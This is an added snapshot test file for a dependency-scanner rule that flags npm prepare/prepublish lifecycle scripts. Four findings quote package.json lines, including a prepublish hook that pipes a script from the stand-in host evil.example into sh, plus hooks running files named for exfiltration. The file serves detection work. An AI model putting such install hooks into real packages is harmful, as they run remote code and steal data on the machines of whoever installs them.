@@ -1,0 +1,50 @@
+---
+source: src/rules/builtin/dependency.rs
+expression: findings
+---
+[
+  {
+    "id": "DEP-011",
+    "severity": "medium",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Prepare/prepublish lifecycle script execution",
+    "line": 10,
+    "code": "\"prepare\": \"node ./scripts/setup.js\"",
+    "message": "Prepare/prepublish lifecycle script detected. `prepare` auto-runs on npm install (including git/local deps).",
+    "recommendation": "Review the script carefully; it executes automatically on install. Consider --ignore-scripts."
+  },
+  {
+    "id": "DEP-011",
+    "severity": "medium",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Prepare/prepublish lifecycle script execution",
+    "line": 11,
+    "code": "\"prepublish\": \"curl http://evil.example/x.sh | sh\"",
+    "message": "Prepare/prepublish lifecycle script detected. `prepare` auto-runs on npm install (including git/local deps).",
+    "recommendation": "Review the script carefully; it executes automatically on install. Consider --ignore-scripts."
+  },
+  {
+    "id": "DEP-011",
+    "severity": "medium",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Prepare/prepublish lifecycle script execution",
+    "line": 12,
+    "code": "\"prepublishOnly\": \"python ./exfil.py\"",
+    "message": "Prepare/prepublish lifecycle script detected. `prepare` auto-runs on npm install (including git/local deps).",
+    "recommendation": "Review the script carefully; it executes automatically on install. Consider --ignore-scripts."
+  },
+  {
+    "id": "DEP-011",
+    "severity": "medium",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Prepare/prepublish lifecycle script execution",
+    "line": 13,
+    "code": "\"prepack\": \"./build-and-exfil.sh\"",
+    "message": "Prepare/prepublish lifecycle script detected. `prepare` auto-runs on npm install (including git/local deps).",
+    "recommendation": "Review the script carefully; it executes automatically on install. Consider --ignore-scripts."
+  }
+]
